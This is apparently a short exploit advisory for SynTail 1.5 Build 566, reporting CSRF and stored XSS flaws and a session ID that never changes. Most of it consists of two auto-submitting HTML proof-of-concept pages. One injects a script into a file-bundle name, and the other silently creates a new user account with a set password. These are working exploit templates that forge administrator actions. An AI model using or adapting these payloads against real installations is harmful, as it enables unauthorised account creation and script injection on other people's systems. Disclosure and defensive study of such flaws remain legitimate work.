# EXPLOIT DESCRIPTION #
SynTail 1.5 Build 566 is vulnerable to CSRF attacks, which can also be combined with stored XSS attacks (authenticated administrators only). The JSESSIONID created when a user logs on to the system is persistent and does not change across requests.


# POC 1 #
The following PoC uses the CSRF vulnerability to create a new file bundle, and combines it with one of the stored XSS vulnerabilities

<html>
<body>
<form name="evilform" method="post" action="http://192.168.0.8:9555/app">
<input type="hidden" name="friendlyName" value="<script>alert("Marlow")</script> />
<input type="hidden" name="selectedPath" value="/home/" />
<input type="hidden" name="showFiles" value="true" />
<input type="hidden" name="st" value="addfb" />
<input type="hidden" name="operation" value="mngFB" />
</form>
<script type="text/javascript">
document.evilform.submit();
</script>
</body>
</html>


# POC 2 #
The following PoC uses the CSRF vulnerability to create a new user with the details shown

<html>
<body>
<form name="evilform" method="post" action="http://192.168.1.245:9555/app?operation=mngUsers">
<input type="hidden" name="fullName" value="marlow" />
<input type="hidden" name="email" value="marlow@marlow.com" />
<input type="hidden" name="password" value="marlow" />
<input type="hidden" name="showFiles" value="true" />
<input type="hidden" name="st" value="addfb" />
<input type="hidden" name="operation" value="mngUsers" />
</form>
<script type="text/javascript">
document.evilform.submit();
</script>
</body>
</html>
